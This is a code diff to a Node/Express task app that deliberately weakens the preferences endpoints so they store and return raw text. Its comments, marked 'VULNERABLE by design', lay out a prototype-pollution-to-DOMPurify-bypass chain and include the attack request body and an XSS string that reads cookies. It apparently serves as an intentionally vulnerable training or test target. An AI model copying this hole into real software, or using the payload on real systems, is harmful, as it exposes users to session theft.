@@ -593,26 +593,53 @@ app.get('/api/tasks/:id', authenticateToken, (req, res) => {
 });
 
 // ============ PREFERENCES ROUTES ============
-// Stores per-user UI preferences (filter state, sort order, etc.) as raw JSON.
+// Stores per-user UI preferences (filter state, sort order, etc.) as raw text.
+//
+// VULNERABLE by design — CVE-2019-11358 (jQuery < 3.4.0 prototype pollution):
+// The value is stored verbatim and returned as raw text. The client parses it
+// via $.parseJSON() and merges via $.extend(true, {}, defaults, parsed).
+//
+// jQuery 3.3.1's $.extend() does not guard against __proto__ keys — when the
+// parsed object contains __proto__, jQuery walks into it and assigns its
+// properties directly onto Object.prototype, poisoning every subsequent object.
+//
+// This then enables CVE-2026-41238 (DOMPurify 3.0.1-3.3.3):
+// DOMPurify's CUSTOM_ELEMENT_HANDLING falls back to {} which inherits from the
+// now-polluted Object.prototype — allowing custom elements with event handlers
+// through sanitization.
+//
+// Attack:
+//   POST /api/preferences  Content-Type: text/plain
+//   Body: {"priority":"all","__proto__":{"tagNameCheck":{},"attributeNameCheck":{}}}
+//
+//   → stored verbatim → returned as text → $.parseJSON constructs real __proto__
+//   → $.extend walks into __proto__ → Object.prototype polluted
+//   → DOMPurify.sanitize('<x-x onfocus=alert(document.cookie) autofocus>') bypassed
 
 app.get('/api/preferences', authenticateToken, (req, res) => {
   db.get('SELECT value FROM user_preferences WHERE user_id = ?', [req.user.id], (err, row) => {
     if (err) return res.status(500).json({ error: 'Failed to fetch preferences' });
-    try { res.json(row ? JSON.parse(row.value) : {}); }
-    catch { res.json({}); }
+    // Return raw text — client parses via $.parseJSON to preserve __proto__ keys
+    res.setHeader('Content-Type', 'text/plain');
+    res.send(row ? row.value : '{}');
   });
 });
 
 app.post('/api/preferences', authenticateToken, (req, res) => {
-  const value = JSON.stringify(req.body);
-  db.run(
-    'INSERT OR REPLACE INTO user_preferences (user_id, value) VALUES (?, ?)',
-    [req.user.id, value],
-    function(err) {
-      if (err) return res.status(500).json({ error: 'Failed to save preferences' });
-      res.json({ message: 'Preferences saved' });
-    }
-  );
+  // Store raw body text verbatim — no JSON.parse so __proto__ keys survive
+  let raw = '';
+  req.on('data', chunk => { raw += chunk; });
+  req.on('end', () => {
+    if (!raw) raw = '{}';
+    db.run(
+      'INSERT OR REPLACE INTO user_preferences (user_id, value) VALUES (?, ?)',
+      [req.user.id, raw],
+      function(err) {
+        if (err) return res.status(500).json({ error: 'Failed to save preferences' });
+        res.json({ message: 'Preferences saved' });
+      }
+    );
+  });
 });
 
 // ============ TASKS ROUTES ============
